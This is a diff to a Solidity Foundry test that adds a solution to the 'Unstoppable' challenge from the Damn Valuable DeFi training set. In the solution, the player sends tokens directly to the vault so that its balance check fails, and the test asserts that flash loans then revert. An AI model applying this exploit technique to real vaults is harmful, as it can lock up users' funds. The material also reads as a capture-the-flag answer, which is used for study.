@@ -8,6 +8,8 @@ import "../../contracts/unstoppable/UnstoppableVault.sol";
 
 import "../../contracts/DamnValuableToken.sol";
 
+error InvalidBalance();
+
 contract UnstoppableChallenge is Test {
 
     address deployer = vm.addr(1);
@@ -30,7 +32,7 @@ contract UnstoppableChallenge is Test {
 
     }
 
-    function testPreAttack() external {
+    function testPreAttack() public {
 
         vm.startPrank(deployer);
         assertTrue(vault.asset() == DVT);
@@ -59,9 +61,19 @@ contract UnstoppableChallenge is Test {
 
     function testAttack() external {
 
-        // vm.expectRevert();
-        // receiverContract.executeFlashLoan(100 * 10 ** 18);
+        console.log("Attack Initiation");
+
+        testPreAttack();
+        assertEq(DVT.balanceOf(player), INITIAL_PLAYER_TOKEN_BALANCE);
+        vm.startPrank(player);
+        DVT.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE/10);
+        vm.stopPrank();
+
+        vm.startPrank(someUser);
+        vm.expectRevert(InvalidBalance.selector);
+        receiverContract.executeFlashLoan(100 * 10 ** 18);
     }
+
 }
 
 
